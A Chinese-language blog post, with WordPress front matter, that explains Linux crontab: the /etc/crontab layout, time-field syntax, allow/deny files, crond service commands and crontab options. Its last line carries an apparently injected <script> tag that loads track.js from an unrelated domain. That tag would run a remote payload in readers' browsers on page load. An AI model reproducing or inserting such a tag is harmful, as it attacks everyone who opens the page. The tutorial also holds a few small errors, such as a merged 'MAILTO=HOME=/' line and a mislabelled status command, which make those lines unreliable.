---
id: 10
title: Linux中crontab定时任务命令
date: '2019-10-29T15:34:06+08:00'
author: gavin
layout: post
guid: 'http://gaving.top/?p=10'
permalink: /index.php/2019/10/29/linux%e4%b8%adcrontab%e5%ae%9a%e6%97%b6%e4%bb%bb%e5%8a%a1%e5%91%bd%e4%bb%a4/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - Linux
---

cat /etc/crontab # 查看配置信息

**PS：如果命令不生效，使用 which 查看命令的执行路径**

系统调度的任务一般存放在/etc/crontab这个文件下，里面存放了一些系统运行的调度程序

通过命令我们可以看一下里面的内容：cat /etc/crontab

/etc/crontab文件包括下面几行：

cat /etc/crontab

SHELL=/bin/bash # 第一行SHELL变量指定了系统要使用哪个shell，这里是bash，

PATH=/sbin:/bin:/usr/sbin:/usr/bin # 第二行PATH变量指定了系统执行 命令的路径

MAILTO=root # 第三行MAILTO变量指定了crond的任务执行信息将通过电子邮件发送给root用户，，如果MAILTO变量的值为空，则表示不发送任务 执行信息给用户

MAILTO=HOME=/ # 第四行的HOME变量指定了在执行命令或者脚本时使用的主目录

\# run-parts # 以下的都是设定的自动执行任务的条件和执行哪项任务

51 \* \* \* \* root run-parts /etc/cron.hourly

24 7 \* \* \* root run-parts /etc/cron.daily

22 4 \* \* 0 root run-parts /etc/cron.weekly

42 4 1 \* \* root run-parts /etc/cron.monthly

**使用者权限文件**

在目录etc下有两个文件

cron.deny # 该文件中所列用户不允许使用crontab命令

cron.allow # 该文件中所列用户允许使用crontab命令

**crontab文件的存放目录**

/var/spool/cron/ # 所有用户crontab文件存放的目录,以用户名命名

**crontab文件的含义：**

用户所建立的crontab文件中，每一行都代表一项任务，每行的每个字段代表一项设置，它的格式共分为六个字段，前五段是时间设定段，第六段是要执行的命令段，格式如下：

minute hour day month week command # \* \* \* \* \* date.py > a.txt，不同的参数对应相同位置的\*,定时执行脚本放到文件内

其中

minute： 表示分钟，可以是从0到59之间的任何整数。

hour：表示小时，可以是从0到23之间的任何整数。

day：表示日期，可以是从1到31之间的任何整数。

month：表示月份，可以是从1到12之间的任何整数。

week：表示星期几，可以是从0到7之间的任何整数，这里的0或7代表星期日。

command：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。

在以上各个字段中，还可以使用以下特殊字符：

星号（\*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。

逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9”

中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6”

正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。同时正斜线可以和星号一起使用，例如\*/10，如果用在minute字段，表示每十分钟执行一次。

**关于crontab服务的指令**

服务操作说明：

/sbin/service crond start //启动服务

/sbin/service crond stop //关闭服务

/sbin/service crond restart //重启服务

/sbin/service crond reload //重新载入配置

/sbin/service crond status //启动服务

查看crontab服务是否已设置为开机启动，执行命令：

ntsysv # 此时进入一个交互界面

**加入开机自动启动：**

chkconfig –level 35 crond on

**crontab语法和命令参数含义**

crontab \[-e \[UserName\]|-l \[UserName\]|-r \[UserName\]|-v \[UserName\]|File \]

参数说明

-e：编辑某个用户的crontab文件内容。如果不指定用户，则表示编辑当前用户的crontab文件。

-l：显示某个用户的crontab文件内容，如果不指定用户，则表示显示当前用户的crontab文件内容。

-r：从/var/spool/cron目录中删除某个用户的crontab文件，如果不指定用户，则默认删除当前用户的crontab文件。

-i：在删除用户的crontab文件时给确认提示。

-v \[UserName\]:列出用户cron作业的状态

file：file是命令文件的名字,表示将file做为crontab的任务列表文件并载入crontab。如果在命令行中没有指定这个文件，crontab命令将接受标准输入（键盘）上键入的命令，并将它们载入crontab

**注意：crontab 是用来让使用者在固定时间或固定间隔执行程序之用，换句话说，也就是类似使用者的时程表。-u user 是指设定指定 user 的时程表，这个前提是你必须要有其权限(比如说是 root)才能够指定他人的时程表。如果不使用 -u user 的话，就是表示设定自己的时程表。-u user：用来设定某个用户的crontab服务，例如，“-u ixdba”表示设定ixdba用户的crontab服务，此参数一般有root用户来运行。**

**环境变量的设置**

在 考虑向cron进程提交一个crontab文件之前，首先要做的一件事情就是设置环境变量EDITOR。cron进程根据它来确定使用哪个编辑器编辑 crontab文件。9 9 %的UNIX和LINUX用户都使用vi，如果你也是这样，那么你就编辑$ HOME目录下的. profile文件，在其 中加入这样一行：EDITOR=vi; export EDITOR

然后保存并退出。不妨创建一个名为<user> cron的文件，其中<user>是用户名，例如， davecron。在该文件中加入如下的内容。

\# (put your own initials here)echo the date to the console every

\# 15minutes between 6pm and 6am

0,15,30,45 18-06 \* \* \* /bin/echo ‘date’ > /dev/console

保存并退出。确信前面5个域用空格分隔。

在 上面的例子中，系统将每隔1 5分钟向控制台输出一次当前时间。如果系统崩溃或挂起，从最后所显示的时间就可以一眼看出系统是什么时间停止工作的。在有些 系统中，用tty1来表示控制台，可以根据实际情况对上面的例子进行相应的修改。为了提交你刚刚创建的crontab文件，可以把这个新创建的文件作为 cron命令的参数：$ crontab davecron

现在该文件已经提交给cron进程，它将每隔1 5分钟运行一次。

同时，新创建文件的一个副本已经被放在/var/spool/cron目录中，文件名就是用户名(即dave)

**常用命令**

crontab -e # 创建自己的一个任务调度，此时会进入到vi编辑界面，来编写我们要调度的任务

crontab -l # 列出定时的任务

crontab -r con\_name # 删除crontab文件

which ifconfig # 获取命令路径<script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>